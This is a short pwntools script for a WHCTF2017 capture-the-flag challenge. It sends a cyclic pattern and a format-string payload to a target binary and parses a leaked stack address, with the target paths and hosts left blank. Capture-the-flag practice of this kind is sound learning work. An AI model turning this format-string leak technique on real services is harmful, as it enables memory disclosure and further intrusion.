#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("")
    elf = ELF("")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    io = remote("", )
    elf = ELF("")
    libc = ELF("")

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)


def fsb(payload):
    io.sendlineafter("Code:\n", "1")
    io.sendlineafter("WHCTF2017:\n", payload)

if __name__ == "__main__":
    fsb(cyclic(1000) + "%s|%5$p|%397$p|")
    io.recvuntil("|0x")
    stackAddr = int(io.recvuntil("|", drop = True), 16)
    success("stackAddr -> {:x}".format(stackAddr))


